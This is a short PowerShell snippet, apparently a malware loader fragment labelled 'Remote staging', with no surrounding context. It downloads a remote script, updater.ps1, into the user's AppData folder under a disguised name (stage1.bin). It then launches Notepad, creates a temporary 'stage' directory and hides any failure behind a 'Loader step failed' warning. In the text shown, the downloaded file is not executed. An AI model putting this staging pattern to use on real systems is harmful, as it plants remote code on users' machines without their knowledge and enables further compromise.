# Remote staging
try { $PayloadUrl = "https://example.net/updater.ps1"; $Stage2Path = "$env:APPDATA\stage1.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "notepad.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $StageMarker = "stage-11" } catch { Write-Warning "Loader step failed" }
